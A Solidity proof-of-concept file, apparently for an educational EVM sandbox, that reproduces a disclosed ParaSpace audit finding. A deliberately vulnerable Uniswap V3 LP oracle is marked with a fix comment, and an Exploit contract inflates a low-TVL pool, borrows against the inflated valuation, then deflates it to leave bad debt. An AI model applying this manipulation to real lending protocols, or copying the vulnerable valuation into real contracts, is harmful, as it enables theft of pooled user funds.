// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  ParaSpace - [H-05] Attacker can manipulate low TVL Uniswap V3 pool to borrow
    (Code4rena 2022-11-paraspace; #15978, reporter minhquanym)
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: UniV3 LP NFT collateral is valued as
      amount0*externalPrice0 + amount1*externalPrice1
    with no TVL/whitelist. Attacker owns a low-TVL pool, flash-inflates the
    position's token0 balance, deposits as collateral, borrows against the
    external-oracle valuation, then deflates - leaving bad debt.
    Vulnerable getTokenPrice aggregation marked @>. */

contract MockERC20 {
    string public symbol;
    uint8 public decimals;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory s, uint8 d) {
        symbol = s;
        decimals = d;
    }

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function approve(address sp, uint256 amt) external returns (bool) {
        allowance[msg.sender][sp] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        _transfer(msg.sender, to, amt);
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        require(a >= amt, "allow");
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amt;
        _transfer(from, to, amt);
        return true;
    }

    function _transfer(address from, address to, uint256 amt) internal {
        require(balanceOf[from] >= amt, "bal");
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
    }
}

/// @dev Low-TVL pool fully owned by attacker; position amounts = pool balances.
contract LowTvlPool {
    MockERC20 public token0;
    MockERC20 public token1;
    uint256 public pos0;
    uint256 public pos1;

    constructor(MockERC20 a, MockERC20 b) {
        token0 = a;
        token1 = b;
    }

    function seed(uint256 a0, uint256 a1) external {
        token0.transferFrom(msg.sender, address(this), a0);
        token1.transferFrom(msg.sender, address(this), a1);
        pos0 = a0;
        pos1 = a1;
    }

    function inflateToken0(uint256 amount) external {
        token0.transferFrom(msg.sender, address(this), amount);
        pos0 += amount;
    }

    function deflateToken0(uint256 amount) external {
        require(pos0 >= amount, "pos");
        pos0 -= amount;
        token0.transfer(msg.sender, amount);
    }
}

/// @dev Reduced UniswapV3OracleWrapper.getTokenPrice - external prices × LP amounts.
contract UniswapV3OracleWrapper {
    uint256 public price0; // 1e18 USD
    uint256 public price1;
    uint8 public dec0;
    uint8 public dec1;
    LowTvlPool public pool;

    constructor(LowTvlPool p, uint256 p0, uint256 p1, uint8 d0, uint8 d1) {
        pool = p;
        price0 = p0;
        price1 = p1;
        dec0 = d0;
        dec1 = d1;
    }

    function getTokenPrice(uint256 /*tokenId*/) public view returns (uint256) {
        uint256 liquidityAmount0 = pool.pos0();
        uint256 liquidityAmount1 = pool.pos1();
        // FIX: whitelist pools with sufficient TVL / use manipulation-resistant sources
        return ((liquidityAmount0 * price0) / (10 ** dec0)) // @> VULN: external spot x amounts, no TVL/whitelist
            + ((liquidityAmount1 * price1) / (10 ** dec1));
    }
}

/// @dev Minimal lending pool: deposit LP NFT id, borrow against oracle value (LTV 100%).
contract LendingPool {
    UniswapV3OracleWrapper public oracle;
    MockERC20 public borrowAsset;
    mapping(address => uint256) public collateralTokenId;
    mapping(address => uint256) public debt;
    uint256 public constant NFT_ID = 1;

    constructor(UniswapV3OracleWrapper o, MockERC20 b) {
        oracle = o;
        borrowAsset = b;
    }

    function depositNFT(address user) external {
        collateralTokenId[user] = NFT_ID;
    }

    function borrow(address user, uint256 amount) external {
        require(collateralTokenId[user] == NFT_ID, "no coll");
        uint256 value = oracle.getTokenPrice(NFT_ID);
        require(debt[user] + amount <= value, "LTV");
        debt[user] += amount;
        borrowAsset.transfer(user, amount);
    }

    function collateralValue(address user) external view returns (uint256) {
        if (collateralTokenId[user] == 0) return 0;
        return oracle.getTokenPrice(NFT_ID);
    }
}

contract Exploit {
    MockERC20 public usdc; // CREATE 1
    MockERC20 public usdt; // CREATE 2
    MockERC20 public dai; // CREATE 3 - borrow asset
    LowTvlPool public pool; // CREATE 4
    UniswapV3OracleWrapper public oracle; // CREATE 5 - vulnerable
    LendingPool public lending; // CREATE 6

    uint256 public constant SEED0 = 100 ether; // $100
    uint256 public constant SEED1 = 100 ether; // $100
    uint256 public constant FLASH = 3_000_000 ether; // $3mm inflate
    uint256 public borrowed;
    uint256 public valueAfterDeflate;
    uint256 public badDebt;

    constructor() {
        usdc = new MockERC20("USDC", 18);
        usdt = new MockERC20("USDT", 18);
        dai = new MockERC20("DAI", 18);
        pool = new LowTvlPool(usdc, usdt);
        // External oracle prices both stablecoins at $1.
        oracle = new UniswapV3OracleWrapper(pool, 1e18, 1e18, 18, 18);
        lending = new LendingPool(oracle, dai);

        // Seed low-TVL pool ($200).
        usdc.mint(address(this), SEED0 + FLASH);
        usdt.mint(address(this), SEED1);
        usdc.approve(address(pool), type(uint256).max);
        usdt.approve(address(pool), type(uint256).max);
        pool.seed(SEED0, SEED1);

        // Lending inventory.
        dai.mint(address(lending), FLASH);
    }

    function run() external {
        // 1) Flash-inflate token0 into attacker-owned low-TVL pool.
        pool.inflateToken0(FLASH);

        // 2) Oracle values LP at ~$3,000,200 via external prices × amounts.
        uint256 inflated = oracle.getTokenPrice(1);
        require(inflated >= FLASH, "not inflated");

        // 3) Deposit LP as collateral and borrow max against inflated value.
        lending.depositNFT(address(this));
        lending.borrow(address(this), FLASH);
        borrowed = dai.balanceOf(address(this));
        require(borrowed == FLASH, "borrow");

        // 4) Deflate: pull flash funds back - position returns to ~$200.
        pool.deflateToken0(FLASH);
        valueAfterDeflate = oracle.getTokenPrice(1);
        require(valueAfterDeflate < 300 ether, "should be ~$200");

        // 5) Protocol left with debt $3mm against ~$200 collateral.
        badDebt = lending.debt(address(this)) - valueAfterDeflate;
        require(badDebt > FLASH - 300 ether, "harm: lending pool holds massive bad debt");
        require(dai.balanceOf(address(this)) == FLASH, "attacker keeps borrowed funds");
    }
}
